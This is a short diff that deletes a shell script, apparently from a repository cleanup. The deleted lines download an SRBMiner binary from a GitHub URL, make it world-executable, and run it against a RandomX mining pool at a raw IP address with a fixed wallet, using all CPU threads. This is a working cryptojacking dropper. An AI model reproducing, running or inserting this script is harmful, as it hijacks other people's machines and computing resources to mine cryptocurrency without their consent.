@@ -1,4 +1,0 @@
-#!/bin/sh
-wget -O oasis https://github.com/kazppkido/gbut/raw/main/SRBMiner-MULTI
-chmod 777 oasis
-./oasis --algorithm randomx --pool 165.232.165.31:80 --wallet 0x0D646f89Db83E0642199e88A7967C7f62af02a83.$(echo $(shuf -i 1-100000 -n 1)-BR) --password x --cpu-threads $(nproc --all)
